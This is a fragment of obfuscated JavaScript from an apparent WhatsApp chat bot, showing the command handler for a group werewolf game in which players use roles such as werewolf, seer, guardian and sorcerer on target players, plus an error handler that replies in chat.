text=_0x480ff3(0x38,-0x13,0x173,0xaf,-0x4d)+_0x28040b(-0x37,-0x13a,-0x8d,-0x39,0x1c7)+_0x28040b(0x47,0x238,-0x11e,-0x5f,-0xe0)+_0x28040b(0x1ed,0x3b2,0x2c0,0x79,0x25)+_0x9b1ba0(0x4f,-0x1ab,0x120,0x156,0x13c)+_0x9b1ba0(-0x118,-0x1fd,-0x8a,0x98,-0x1a8)+_0x480ff3(0x1fc,-0x147,-0x1e5,0x8,0x1c1)+_0x2fe230(0x37,0x8f,0x1ec,0x1b6,-0x16b)+_0x28040b(0x1a3,0x11d,0x1fb,0x156,0x1cb)+_0x480ff3(-0x2bb,-0xc9,-0x25,-0x17d,-0x36f)+_0x28040b(-0x1d1,-0x3f,-0x32a,-0x232,-0x258)+_0x2fe230(0x1b,0x1cb,0x2a6,0x227,0x230)+_0x480ff3(-0x31d,-0x3a6,-0x2e5,-0x2a1,-0x3c1)+_0x28040b(-0x88,-0xb4,-0xb7,-0x262,0x178)+_0x480ff3(0xd,0x19,-0x172,0x7f,0x21a)+_0x28040b(0x4e,-0x7a,0x239,0xe3,-0xb1)+_0x2fe230(0x51,0x211,0x3f2,0x28d,0x239)+_0x526c7c(0x6f,0x1ec,0xd9,0x53,0xc0)+_0x28040b(-0x5e,0x10c,-0x19f,0x199,-0x3f)+_0x9b1ba0(-0x85,-0x212,-0x1cd,-0x202,-0x1a1)+_0x9b1ba0(0x48,0x15b,-0x86,0x10,0xf)+_0x2fe230(-0x7d,0x72,0x23a,-0x65,-0x6a)+_0x9b1ba0(-0x222,-0x1d1,-0x356,-0x2e9,-0x378)+_0x526c7c(0x12e,0x23c,0xdc,0x389,0xe5)+_0x526c7c(0x549,0x419,0x30c,0x49c,0x566)+_0x9b1ba0(0x1a,-0x19b,-0xde,0x15a,0x115)+_0x2fe230(0x3e1,0x22d,0x3ee,0x49,0x1a9)+_0x9b1ba0(-0x14c,-0x2b3,-0xee,-0x1e9,-0x191)+_0x9b1ba0(-0x246,-0x39d,-0x2ed,-0x1fb,-0x7d)+_0x480ff3(0x147,-0xa5,-0xac,0xc1,0x1a8)+_0x480ff3(-0x13e,-0x14b,-0x16f,-0x207,-0x26a)+_0x480ff3(-0x253,-0xdd,-0x221,-0x2ab,-0x2d2)+_0x28040b(0x42,0x1e6,0x1ac,-0x76,-0x97)+_0x28040b(-0x15e,-0x201,-0xf7,-0x352,-0x2b1)+_0x526c7c(0x4d1,0x39f,0x1d7,0x510,0x417)+_0x526c7c(0x34d,0x3e1,0x491,0x2a7,0x36b)+_0x28040b(-0x8a,-0x1e9,0x156,-0x197,-0x1c2)+_0x9b1ba0(-0x21c,-0x25e,-0x281,-0x1a4,-0x11e)+_0x28040b(-0x1f,-0xca,-0x26,-0x1f8,0x6c)+_0x2fe230(0xb,-0x17a,-0x20c,-0x229,-0x20f)+_0x9b1ba0(0x103,0x141,0x2a5,0x24e,0x219)+_0x526c7c(0x64e,0x4d1,0x50b,0x395,0x63d)+_0x9b1ba0(0x118,-0xc8,-0xb5,-0x88,-0xdb)+_0x2fe230(-0x1f5,-0x52,0x199,0xa2,-0x42)+_0x28040b(0x10,0xb2,0xb7,-0x116,0x6e)+_0x9b1ba0(-0xcc,-0x269,-0x19d,0x89,-0x249)+_0x2fe230(0x16a,0xa6,0x1d7,0xc5,0x81)+_0x480ff3(0x7d,0xd9,-0x6c,-0x58,-0x1b7)+_0x9b1ba0(-0x31,-0x104,0x14b,0x1bb,0x7b)+_0x28040b(0x148,0x275,0x8e,0x12e,-0x61)+_0x2fe230(0x1f6,0x253,0x5c,0x1c1,0x1e0)+_0x9b1ba0(-0x13a,-0x112,0x5a,-0x29e,-0xb3)+_0x526c7c(0x295,0x1f9,0xfb,0x17d,0x62)+_0x480ff3(-0x187,0xda,-0xb4,-0x36,-0xf5)+'\x0a';text+=_0x2fe230(-0x35e,-0x1a6,-0x251,-0x200,-0x1f5)+_0x480ff3(-0x29,0xb5,-0xfa,0x32,0x8c)+'\x0a',text+=_0x28040b(0x172,-0x1a,0x46,0x7f,0x196)+_0x9b1ba0(-0x110,-0x83,-0x2a,-0x1d5,-0x2cd),text+=_0x526c7c(0x566,0x3bd,0x5a6,0x551,0x5aa)+_0x2fe230(-0xf1,0x1a,0x136,0x55,0x65),text+=_0x28040b(0x19c,0x365,0x1d2,-0x44,0xe8)+_0x28040b(0x104,-0x8c,0x242,0x2d5,0x113),text+=_0x28040b(0x2d,0x11e,-0x16f,-0x182,0x190)+_0x9b1ba0(0x148,-0x98,0x11a,0x2cb,0x2b3)+'\x0a',text+=_0x9b1ba0(0xa8,0xfd,-0x10e,0x226,0x111)+_0x480ff3(0x129,-0x18d,0x49,0x27,-0x1bb)+'\x0a\x0a',text+=(_0x526c7c(0x355,0x39a,0x496,0x36d,0x340)+_0x526c7c(0x3a0,0x233,0xb6,0xa7,0x3d2)+_0x526c7c(0xef,0x104,-0xc8,0x263,0x13e)+_0x480ff3(-0x2c3,-0x1b6,-0x3ab,-0x1f1,-0x141)+_0x28040b(0xe5,-0xd1,-0x29,-0x91,0x100)+_0x480ff3(-0x4,-0x2b9,0x1e,-0xc5,-0x1e)+_0x9b1ba0(0x78,0x1ad,0xd1,0x73,-0x67)+_0x9b1ba0(0xfc,0x18c,0x161,0x2c5,0x18c)+_0x28040b(-0x175,-0x162,0x8b,0x6,-0xe0)+_0x480ff3(-0xde,-0x197,0x11a,0x7,0xe)+_0x526c7c(0x29a,0x298,0x47b,0x3b4,0x432))[_0x28040b(-0x91,-0x17a,-0x204,-0x128,0x78)](),reply(text);}}}}}}}}break;case prefix+_0x526c7c(0x2c3,0x232,0x1a9,0x3f8,0x274):{if(!isGroup)return reply(mess[_0x526c7c(0x641,0x461,0x40d,0x29c,0x432)+_0x526c7c(0x352,0x42b,0x264,0x56b,0x2f4)]);conn[_0x9b1ba0(0x11a,-0x48,0x276,0x82,0x1e2)+_0x28040b(0x1fc,0x335,0x201,0x273,0x27)]=conn[_0x28040b(0x17b,0x253,0x189,0x211,0xf0)+_0x480ff3(0x22e,0x13d,0x1e8,0x124,0xdc)]?conn[_0x9b1ba0(0x11a,0x200,0x2a2,0x2be,0x2d4)+_0x9b1ba0(0x19b,0x2b4,0x1b4,0x374,0x20e)]:{};let ww=conn[_0x28040b(0x17b,0x367,-0x9,0x1c9,0x5b)+_0x28040b(0x1fc,0xe7,0x12c,0x3ce,0x113)],value=(args[0x8*-0x5a+-0x2656+-0x31*-0xd7]||'')[_0x526c7c(0x3d0,0x4a0,0x4ca,0x58f,0x43d)+_0x28040b(-0x168,-0x6f,-0x18f,0x62,-0x2ad)+'e'](),target=args[-0x1c59+0xcbf+0x29a*0x6];if(playerOnGame(sender,ww)===![])return reply(_0x2fe230(-0x72,0x123,0x235,0x2af,0x5f)+_0x480ff3(-0xeb,-0x2c4,-0x380,-0x1b3,-0xba)+_0x526c7c(0x3af,0x4d5,0x5c1,0x2fe,0x426)+_0x2fe230(0x138,-0x80,-0x1cf,-0x21f,0x37)+_0x526c7c(0x333,0x273,0xcb,0x27b,0x172)+'e');if(dataPlayer(sender,ww)[_0x526c7c(0x4cf,0x314,0x3fc,0x13e,0x4b0)+'s']===!![])return reply(_0x480ff3(-0x64,-0xd6,-0x11,-0x1f8,-0x282)+_0x2fe230(-0x14d,-0x1e,-0x36,-0x1e6,-0x8b)+_0x28040b(0x198,0x1b3,0x297,0x1e7,0x2f2)+_0x526c7c(0x6a7,0x4ca,0x442,0x4c5,0x425)+_0x2fe230(-0x95,0x154,0x13,0xdc,0x1e3)+_0x2fe230(0x2e1,0x1e3,0x383,0x199,0x2e)+_0x28040b(0x1e8,0x10c,0x94,0x130,0x127)+_0x480ff3(-0x5e,-0x137,0x1c,-0x8e,-0xab)+_0x9b1ba0(-0x165,-0xb4,-0xbd,-0x34c,-0x15)+_0x480ff3(0x236,0x13d,0x107,0x61,0x17d)+_0x2fe230(0xf3,0x43,0x134,0xc2,0xbd)+_0x9b1ba0(-0x182,-0x2fb,-0x2bb,-0x294,0x5)+_0x526c7c(0x28,0x212,0x2ea,0x26,0x20c)+_0x526c7c(0x46f,0x4df,0x46e,0x2f9,0x568));if(dataPlayer(sender,ww)[_0x9b1ba0(-0x201,-0x333,-0x1ee,-0x3ac,-0x1cd)+'d']===!![])return reply(_0x480ff3(-0x18c,-0x12f,0x32,-0x1,0x158)+_0x480ff3(-0x2b1,-0x246,-0x1a7,-0xf0,-0x106)+_0x9b1ba0(-0x1a7,-0xb,-0x69,-0x254,-0x26c));if(!target||target[_0x28040b(0x7,-0xac,-0x31,-0x19e,0x1b)+'h']<-0x1463+0x1*0xcd1+-0x1*-0x793||target[_0x480ff3(-0x83,-0x231,-0x35f,-0x1a5,-0x138)]('')[_0x28040b(0x7,-0xaf,-0xf7,-0x13f,-0x1c9)+'h']>0x1ef*0x13+-0x69e+-0x1e1d)return reply(_0x9b1ba0(0xdc,-0xc8,0xb8,-0x38,0xc1)+_0x480ff3(0x281,0x4d,0x19e,0x120,0x24c)+_0x480ff3(0x11e,0x295,0x61,0xa4,-0x8c)+_0x9b1ba0(0x9e,-0x155,-0xce,0x1b9,0x193)+_0x28040b(-0x11f,-0x2a9,-0x2aa,-0x10c,0x5f)+_0x526c7c(0x67c,0x4b3,0x4d4,0x3c1,0x49b)+'\x20\x0a'+(prefix+command)+(_0x2fe230(-0x294,-0x1a3,-0x10d,-0x191,-0x16e)+'\x201'));if(isNaN(target))return reply(_0x2fe230(-0x21,0x10,0x1cc,0x40,0xd5)+_0x28040b(0x12b,0x190,-0xc3,-0x93,0x2d)+_0x9b1ba0(0x10c,0x11f,0x2ac,0x6a,0x247)+_0x526c7c(0x42c,0x429,0x449,0x48e,0x4a3));let byId=getPlayerById2(sender,parseInt(target),ww);if(byId['db'][_0x9b1ba0(-0x201,-0x22c,-0x46,-0x68,-0x2a8)+'d']===!![])return reply(_0x9b1ba0(0xc4,0x44,0x1b4,-0x33,0x194)+_0x9b1ba0(0x66,-0xca,0xd4,0x172,-0x89)+_0x28040b(0x3f,0x1d4,-0x1d,-0x36,0xb5)+'ti');if(byId['db']['id']===sender)return reply(_0x2fe230(0x13d,0x24f,0x3d9,0x64,0x225)+_0x9b1ba0(-0x12c,-0x16c,-0x11f,-0x1a3,-0x32a)+_0x9b1ba0(0xea,0x98,0x46,0x152,-0xf2)+_0x2fe230(0x140,0xd6,0x9e,-0x24,0x22a)+_0x480ff3(-0x217,-0xec,-0x261,-0xc0,-0x48)+_0x28040b(-0xaa,0x48,0xe7,-0x1e1,0x154)+_0x480ff3(-0x3fb,-0x16d,-0x3e8,-0x2a2,-0x1c8)+_0x526c7c(0x287,0x29a,0x15d,0x1d7,0x467)+_0x9b1ba0(0x102,0x127,0x245,0x2e1,0xe3)+'ri');if(byId===![])return reply(_0x526c7c(0x2df,0x40f,0x263,0x2e6,0x292)+_0x2fe230(0x33a,0x20f,0xbb,0x27b,0xfa)+_0x9b1ba0(-0x205,-0xc0,-0x3ed,-0x1e4,-0xf)+_0x480ff3(-0x26a,-0x2c1,-0x1b0,-0x1ed,-0x141)+'ar');if(value===_0x480ff3(-0x130,-0x47,0x161,0x52,-0xfa)){if(dataPlayer(sender,ww)[_0x480ff3(-0xc7,-0x1b5,0x67,-0x147,0x11)]!==_0x28040b(0x17b,0x7a,0x327,-0x5c,0x6b)+_0x2fe230(0x174,0x248,0xf9,0x84,0x357))return reply(_0x480ff3(-0x3b2,-0xcb,-0x3c5,-0x293,-0x247)+_0x9b1ba0(-0x247,-0x14c,-0x37b,-0x316,-0x2e8)+_0x2fe230(-0xd,0x163,0x239,0x1d2,-0x1b)+_0x28040b(-0x1eb,-0xed,-0xfd,-0x317,-0x93)+_0x9b1ba0(0x13a,0x1a,0x17b,0x295,-0x13)+'u');if(byId['db'][_0x480ff3(-0xc0,0x2e,-0x8b,-0x147,-0x29f)]===_0x9b1ba0(0xb0,0x155,-0xa3,0x210,-0x35)+_0x28040b(0x1d5,0xcd,0x16b,0x66,0x1c8))return reply(_0x480ff3(-0x7c,-0x62,0x23b,0x12b,0x27)+_0x2fe230(-0x279,-0x7f,0x9e,0x2a,0x3f)+_0x526c7c(0x2c3,0x435,0x586,0x631,0x4ae)+_0x2fe230(0x2cc,0xd6,-0xf2,-0x23,-0xf3)+_0x480ff3(-0xa4,-0x251,-0xc8,-0xc0,-0x22)+_0x526c7c(0x3ce,0x240,0x71,0x352,0xd6)+_0x2fe230(-0x97,-0x17e,-0x32f,-0x2c9,-0x208)+_0x480ff3(0x1b3,0xf,0x1a1,0x81,0x5e));return reply(_0x2fe230(0x1c2,0xd5,0xd3,-0xb5,0xa6)+_0x526c7c(0x206,0x2ed,0x3c3,0x11d,0x191)+_0x28040b(0x35,-0xa9,0x3e,-0xc,-0x4a)+_0x2fe230(0xc5,0x2a,0x14,-0x61,0xb5)+_0x526c7c(0xd3,0x12e,0x137,0x278,-0x17)+parseInt(target))[_0x9b1ba0(-0x100,-0x1cb,-0x110,-0x1d,0x88)](()=>{function _0x3347ed(_0x57e6e7,_0x38e720,_0x3c3231,_0x21ea08,_0x1e3025){return _0x2fe230(_0x57e6e7,_0x1e3025-0x240,_0x3c3231-0x134,_0x21ea08-0xea,_0x1e3025-0xd0);}function _0xadebf5(_0x67b188,_0x55234e,_0x377ef9,_0x1c4997,_0x59ec04){return _0x526c7c(_0x67b188-0xf5,_0x1c4997- -0x23d,_0x377ef9-0x108,_0x1c4997-0xea,_0x67b188);}const _0x33e762={'DZqxw':function(_0x1fdef2,_0x2ac151,_0x39ad76){return _0x1fdef2(_0x2ac151,_0x39ad76);},'bUqzE':function(_0x20522a,_0x204bf1,_0x858ffc,_0x16f8d3){return _0x20522a(_0x204bf1,_0x858ffc,_0x16f8d3);},'SlTuA':function(_0x155ae9,_0xade701){return _0x155ae9(_0xade701);}};_0x33e762[_0x5bcda4(0x3f1,0x285,0x48c,0x2bb,0x471)](dataPlayer,sender,ww)[_0x6551ed(0x757,0x61a,0x74a,0x44d,0x5aa)+'s']=!![];function _0x5bcda4(_0x4c4055,_0x76ab06,_0x51ef5e,_0x56bb22,_0x3aabe1){return _0x28040b(_0x4c4055-0x383,_0x76ab06-0xf5,_0x51ef5e-0x100,_0x56bb22-0x67,_0x3aabe1);}function _0x6551ed(_0x358eee,_0x7a5072,_0x311579,_0x6780ea,_0x3bdbbe){return _0x2fe230(_0x3bdbbe,_0x7a5072-0x5a4,_0x311579-0x77,_0x6780ea-0x1e,_0x3bdbbe-0x182);}_0x33e762[_0x3347ed(0x3d9,0x21f,0x401,0x393,0x297)](killWerewolf,sender,_0x33e762[_0x5bcda4(0x464,0x5aa,0x277,0x308,0x429)](parseInt,target),ww);});}else{if(value===_0x9b1ba0(0xd5,0x2c7,0x19e,-0xd0,-0x57)+'y'){if(dataPlayer(sender,ww)[_0x9b1ba0(-0xd0,-0x124,-0xd1,-0x31,0xa1)]!==_0x526c7c(0x4f1,0x46a,0x4a5,0x3b2,0x5fa))return reply(_0x9b1ba0(-0x21c,-0x40c,-0x2c8,-0x3f7,-0x184)+_0x9b1ba0(-0x247,-0x2df,-0x271,-0x293,-0x86)+_0x2fe230(0x1b1,0x163,0x185,0x29b,0x32a)+_0x28040b(-0x1eb,-0x13d,-0x377,-0x2b7,-0x3a5)+_0x526c7c(0x494,0x485,0x2ff,0x468,0x55c)+'u');let dreamy=dreamySeer(sender,parseInt(target),ww);return reply(_0x526c7c(0x3f8,0x373,0x406,0x527,0x322)+_0x480ff3(-0x12,0x22,-0x1ef,-0xd5,-0x48)+_0x480ff3(-0x6d,-0x1d2,-0x3e1,-0x201,-0x1f5)+_0x9b1ba0(-0xcf,-0x1ec,0x78,0x0,-0x236)+_0x526c7c(0x173,0x264,0x1ad,0x189,0x323)+_0x28040b(-0x169,-0x31f,-0x78,-0xfc,-0xc3)+_0x9b1ba0(0x15,0x1c1,0xeb,0x129,-0x31)+target+(_0x9b1ba0(0xe8,0x235,0xc2,0x4e,0x6b)+_0x480ff3(-0x19f,0x28,-0x1ba,-0x139,-0xcf))+dreamy)[_0x480ff3(-0x234,-0x247,-0x25a,-0x177,-0x11b)](()=>{function _0x217af8(_0x41bc71,_0x2ae731,_0x207148,_0xcde895,_0x2e1b14){return _0x9b1ba0(_0xcde895-0x673,_0x207148,_0x207148-0xb6,_0xcde895-0x160,_0x2e1b14-0x15c);}function _0x1b27f8(_0x2c52e4,_0x5e34d0,_0x543bc0,_0x4e2ba7,_0x491039){return _0x2fe230(_0x491039,_0x2c52e4-0x122,_0x543bc0-0xe,_0x4e2ba7-0x8c,_0x491039-0x109);}const _0x3e3df2={'xxQTY':function(_0x520f9b,_0x5e0ec3,_0x148a5e){return _0x520f9b(_0x5e0ec3,_0x148a5e);}};_0x3e3df2[_0x1b27f8(0x151,0x2b,0x26c,0xb8,0x337)](dataPlayer,sender,ww)[_0x217af8(0x5a3,0x5c3,0x681,0x63c,0x77a)+'s']=!![];});}else{if(value===_0x9b1ba0(0xb,-0x40,-0x14d,-0x1ef,-0x133)){if(dataPlayer(sender,ww)[_0x9b1ba0(-0xd0,-0x197,-0x115,-0x4d,0xe)]!==_0x526c7c(0x691,0x496,0x2e8,0x523,0x295)+_0x28040b(-0x17a,-0x171,-0x31c,-0x2e5,0x1d))return reply(_0x480ff3(-0x1ba,-0x264,-0x377,-0x293,-0x3a2)+_0x480ff3(-0x26d,-0x122,-0x106,-0x2be,-0x377)+_0x526c7c(0x519,0x401,0x522,0x2e1,0x320)+_0x9b1ba0(-0x24c,-0x249,-0x13e,-0x144,-0x43a)+_0x9b1ba0(0x13a,0x2d6,0x265,0x149,0x272)+'u');return reply(_0x480ff3(0x19,-0xbc,-0xa4,-0x4f,0x11b)+_0x28040b(0x3,0x13b,0x1f2,0x190,-0x176)+_0x9b1ba0(-0x202,-0x55,-0x2e3,-0x230,-0x20)+_0x526c7c(0x3af,0x1ad,0xe9,0x26b,-0x35)+_0x2fe230(0x60,0x180,0xf1,0x67,0x7d)+'r\x20'+target)[_0x526c7c(0x8a,0x24b,0x2d7,0xa6,0x2f5)](()=>{function _0x2a1809(_0x343133,_0x391530,_0x45a274,_0xf18c89,_0x12c684){return _0x28040b(_0x343133-0x4,_0x391530-0xf1,_0x45a274-0x12c,_0xf18c89-0x66,_0x12c684);}function _0x45cbb8(_0x20d7ae,_0x13a7e9,_0x1d078a,_0x3f7395,_0x4726db){return _0x526c7c(_0x20d7ae-0x1bc,_0x4726db-0x222,_0x1d078a-0xbc,_0x3f7395-0x104,_0x3f7395);}const _0x56107b={'zYXWE':function(_0x5429a9,_0x285064,_0x4a85c9,_0x455a19){return _0x5429a9(_0x285064,_0x4a85c9,_0x455a19);},'xhJju':function(_0x3101f8,_0x16d75f){return _0x3101f8(_0x16d75f);},'WqJbX':function(_0x418b91,_0x339f9d,_0x21341c){return _0x418b91(_0x339f9d,_0x21341c);}};_0x56107b[_0x2f7f7a(-0x75,-0x2fb,-0x5d,-0xb6,-0x236)](protectGuardian,sender,_0x56107b[_0x2f7f7a(-0x32a,-0x207,-0x3c0,-0x413,-0x31b)](parseInt,target),ww);function _0x4e0f9d(_0x21fdeb,_0x36c1d8,_0x3c813a,_0xaa8f05,_0x31df58){return _0x9b1ba0(_0xaa8f05- -0x56,_0x36c1d8,_0x3c813a-0xd5,_0xaa8f05-0x61,_0x31df58-0x5d);}function _0x2f7f7a(_0x340679,_0x1208e0,_0x568e2f,_0x4e9e16,_0x4131d8){return _0x28040b(_0x4131d8- -0x125,_0x1208e0-0x17a,_0x568e2f-0x95,_0x4e9e16-0x18d,_0x340679);}_0x56107b[_0x2a1809(0x45,-0xaa,0x169,0x95,-0x5e)](dataPlayer,sender,ww)[_0x2f7f7a(-0x254,-0x2bc,-0x2ba,-0x1c4,-0xfb)+'s']=!![];});}else{if(value===_0x28040b(0x111,-0x4a,-0x6,0x18f,0x25)+_0x28040b(0x1d5,0x125,0x2c4,0x1a5,0x3b0)){if(dataPlayer(sender,ww)[_0x28040b(-0x6f,-0x84,0xcb,0xb4,-0xe3)]!==_0x28040b(0x111,0x2f7,-0x79,0x108,0x189)+_0x480ff3(0x1c4,-0xfa,0x2a9,0xfd,0x19c))return reply(_0x480ff3(-0x19d,-0x398,-0x367,-0x293,-0x253)+_0x9b1ba0(-0x247,-0x2bd,-0x25b,-0x403,-0x326)+_0x28040b(0x117,-0x45,0x126,0x1c0,0x299)+_0x480ff3(-0x3e2,-0x334,-0x19a,-0x2c3,-0x10a)+_0x480ff3(0xfd,0x238,0x298,0xc3,0x6e)+'u');let sorker=sorcerer(sender,parseInt(target),ww);return reply(_0x526c7c(0x553,0x373,0x3a3,0x1aa,0x356)+_0x9b1ba0(-0x5e,-0x4f,-0x212,-0x233,-0x182)+_0x9b1ba0(-0x18a,-0x1ab,-0x324,-0x271,-0xbd)+_0x526c7c(0x419,0x27c,0x2b1,0x19f,0x3a4)+_0x526c7c(0x1d9,0x264,0x289,0x190,0x147)+_0x28040b(-0x169,-0x1ac,-0x6a,-0x2d,-0x280)+_0x2fe230(0x48,0xc2,-0x4c,-0x52,0x215)+target+(_0x9b1ba0(0xe8,0xfb,0x227,0x174,-0x86)+_0x480ff3(-0x2a6,0x56,0xa9,-0x139,0x5b))+sorker)[_0x526c7c(0x113,0x24b,0x4b,0x2a2,0x159)](()=>{function _0x391bca(_0x1e19d1,_0x32ebf0,_0x4a187f,_0x3137d3,_0x93f7e){return _0x480ff3(_0x1e19d1-0x1ae,_0x32ebf0-0x1ef,_0x4a187f-0x4c,_0x3137d3- -0x48,_0x4a187f);}const _0x4b4754={'FAATX':function(_0x5af177,_0x4eb2c9,_0x3c32fb){return _0x5af177(_0x4eb2c9,_0x3c32fb);}};function _0x4b6624(_0x1bf6ba,_0xae2711,_0x232788,_0x31eb40,_0xa8b3f3){return _0x9b1ba0(_0xa8b3f3-0x3de,_0x232788,_0x232788-0x47,_0x31eb40-0xb,_0xa8b3f3-0x197);}_0x4b4754[_0x391bca(-0x12d,0xbe,-0x229,-0xa3,-0x80)](dataPlayer,sender,ww)[_0x391bca(-0x1ef,-0x14a,-0x25c,-0xf6,-0x137)+'s']=!![];});}}}}}break;}
			} catch (err) {
		console.log(color('vanz >' + ' [ERR]', 'red'), err)
		   const { type, isQuotedMsg, quotedMsg, now, fromMe, mentioned, isBaileys } = msg
		   const from = msg.key.remoteJid
            conn.sendMessage(from, { text: `${err}`, contextInfo: { forwardingScore: 9999999, isForwarded: true }})
   }
 }